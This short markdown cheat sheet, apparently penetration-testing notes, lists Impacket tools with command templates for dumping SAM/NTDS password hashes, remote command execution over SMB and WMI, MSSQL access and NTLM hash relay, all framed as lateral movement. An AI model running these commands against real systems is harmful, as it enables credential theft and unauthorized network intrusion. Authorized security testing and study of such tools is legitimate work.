# Impacket Toolkit

## Purpose
Python toolkit for interacting with Windows protocols.

## Common Tools

### secretsdump
Dump hashes from SAM/NTDS

`impacket-secretsdump domain/user:password@target

### psexec
Command execution via SMB

`impacket-psexec domain/user:password@target

### smbexec
Semi-interactive shell

`impacket-smbexec domain/user:password@target

### wmiexec
Command execution via WMI

`impacket-wmiexec domain/user:password@target

### mssqlclient
Connect to MSSQL

`impacket-mssqlclient domain/user:password@target

### ntlmrelayx
Relay captured hashes

`impacket-ntlmrelayx -tf targets.txt

## Notes
Core toolkit for lateral movement.